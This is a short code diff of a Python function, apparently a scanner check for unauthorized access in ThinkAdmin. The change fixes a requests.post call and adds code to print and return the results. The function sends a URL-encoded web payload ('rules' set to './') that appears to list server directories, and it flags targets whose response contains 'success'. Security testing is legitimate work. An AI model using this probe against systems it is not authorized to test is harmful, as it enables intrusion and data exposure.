@@ -17,7 +17,7 @@ def check(url):
             results.append('thinkadmin_unauthorized_access | ' +
                            url + payload1 + ' | get | ')
 
-        r = requests.post(url + payload2, 'post',
+        r = requests.post(url + payload2, 
                           data='rules=%5b%22%2e%5c%2f%22%5d', headers=headers)
         if '成功' in r.text:
             print("成功")
@@ -29,6 +29,9 @@ def check(url):
             print('成功')
             results.append('thinkadmin_unauthorized_access | ' +
                            url + payload3 + ' | get | ')
+                        
+        print(results)
+        return results
 
     except Exception as e:
         return e
